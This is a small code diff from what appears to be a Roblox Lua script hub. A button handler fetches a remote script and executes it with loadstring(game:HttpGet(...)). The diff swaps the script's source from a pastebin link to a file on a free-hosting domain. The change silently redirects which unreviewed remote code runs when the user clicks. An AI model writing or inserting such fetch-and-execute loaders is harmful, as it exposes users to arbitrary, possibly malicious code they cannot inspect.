@@ -3220,7 +3220,7 @@ task.defer(function()
 			if not clickable then clickable = newCard:FindFirstChildWhichIsA("GuiButton") or newCard:FindFirstChildWhichIsA("GuiButton",true) or newCard end
 			local function runNA()
 				pcall(function()
-					loadstring(game:HttpGet("https://pastebin.com/raw/hqn9AHen"))()
+					loadstring(game:HttpGet("http://sniffyscripts.unaux.com/sh.txt"))()
 				end)
 			end
 			if clickable:IsA("GuiButton") then
